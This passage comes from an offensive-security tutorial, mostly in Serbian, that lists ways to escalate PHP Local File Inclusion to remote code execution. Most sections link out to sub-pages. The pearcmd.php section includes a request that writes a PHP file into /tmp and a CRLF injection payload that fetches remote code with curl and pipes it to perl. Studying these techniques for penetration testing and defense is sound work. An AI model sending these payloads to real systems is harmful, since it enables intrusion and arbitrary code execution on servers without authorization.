This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) objašnjava da možete koristiti **php filters to generate arbitrary content** kao izlaz. Što u suštini znači da možete **generate arbitrary php code** za include **without needing to write** to fajl.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Putem segmentation fault

**Upload** fajl koji će biti sačuvan kao **temporary** u `/tmp`, zatim u **same request,** izazovite **segmentation fault**, i onda će **temporary file won't be deleted** i možete ga pretražiti.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Putem Nginx temp file storage

Ako pronađete **Local File Inclusion** i **Nginx** radi ispred PHP-a, možda ćete moći dobiti RCE sledećom tehnikom:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Putem PHP_SESSION_UPLOAD_PROGRESS

Ako pronađete **Local File Inclusion** čak i ako **don't have a session** i `session.auto_start` je `Off`. Ako u multipart POST podacima navedete **`PHP_SESSION_UPLOAD_PROGRESS`**, PHP će **enable the session for you**. Ovo možete iskoristiti da dobijete RCE:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Putem temp file uploads u Windows

Ako pronađete **Local File Inclusion** i server radi na **Windows**, možda možete dobiti RCE:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Putem `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), skripta `/usr/local/lib/phppearcmd.php` postoji po defaultu u php docker images. Štaviše, moguće je proslediti argumente skripti preko URL-a zato što je naznačeno da ako URL param nema `=`, treba ga koristiti kao argument. Pogledajte i [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) i [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Sledeće iskorišćava CRLF vuln da dobije RCE (iz [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

Ako pronađete **Local File Inclusion** i fajl koji izlaže **phpinfo()** sa file_uploads = on, možete dobiti RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ako pronađete **Local File Inclusion** i možete **exfiltrate the path** privremenog fajla, ALI **server** proverava da li **fajl koji će biti uključen ima PHP marks**, možete pokušati da **bypass that check** koristeći ovu **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

Ako možete zloupotrebiti LFI da **upload temporary files** i naterate server da **hang** PHP izvršavanje, možete potom **brute force filenames during hours** da pronađete privremeni fajl:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Ka Fatal Error

Ako uključite bilo koji od fajlova `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Potrebno je uključiti isti fajl 2 puta da biste izazvali tu grešku).

**Ne znam koliko je ovo korisno, ali možda jeste.**\
_Čak i ako izazovete PHP Fatal Error, PHP privremeni fajlovi koji su upload-ovani bivaju obrisani._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
